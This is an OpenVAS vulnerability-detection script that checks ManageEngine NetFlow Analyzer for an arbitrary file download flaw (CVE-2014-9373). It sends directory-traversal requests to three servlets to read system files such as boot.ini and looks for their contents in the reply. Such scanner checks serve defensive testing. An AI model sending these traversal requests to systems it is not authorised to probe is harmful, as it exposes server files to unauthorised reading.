###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_NetFlow_Analyzer_lfi_12_14.nasl 12102 2018-10-25 14:45:31Z cfischer $
#
# Netflow Analyzer Arbitrary File Download
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105127");
  script_version("$Revision: 12102 $");
  script_cve_id("CVE-2014-9373");
  script_bugtraq_id(71640);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-25 16:45:31 +0200 (Thu, 25 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-12-01 17:20:40 +0200 (Mon, 01 Dec 2014)");
  script_name("Netflow Analyzer Arbitrary File Download");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://uploads.zohocorp.com/Internal_Useruploads/dnd/NetFlow_Analyzer/p1982sg3vuo9pibt15p01uju1hv0/consolidated_1Dec.zip");

  script_tag(name:"impact", value:"Arbitrary file download of local files.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"solution", value:"Vendor fixes are available. Please see the references for more information.");

  script_tag(name:"summary", value:"An attacker can exploit this issue using directory-traversal strings to
  view files in the context of the web server process.");

  script_tag(name:"affected", value:"NetFlow v8.6 to v9.9.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

port = get_http_port( default:80 );
buf = http_get_cache( item:"/netflow/jspui/NetworkSnapShot.jsp", port:port );

if( ! buf || buf !~ "Login - Netflow Analyzer" )
  exit( 0 );

files = traversal_files();
urls = make_array();

foreach pattern( keys( files ) ) {

  file = files[pattern];
  urls[ "/netflow/servlet/CSVServlet?schFilePath=/" + file ] = pattern;
  urls[ "/netflow/servlet/DisplayChartPDF?filename=../../../../../../../../" + file ] = pattern;

  if( file =~ "(boot|win)\.ini" ) {
    file = str_replace( find:"/", string:file, replace:"\\" );
    urls[ "/netflow/servlet/CReportPDFServlet?schFilePath=C:\\" + file + "&pdf=true" ] = pattern;
  } else {
    urls[ "/netflow/servlet/CReportPDFServlet?schFilePath=/" + file + "&pdf=true" ] = pattern;
  }
}

foreach url( keys( urls ) ) {

  pattern = urls[url];

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );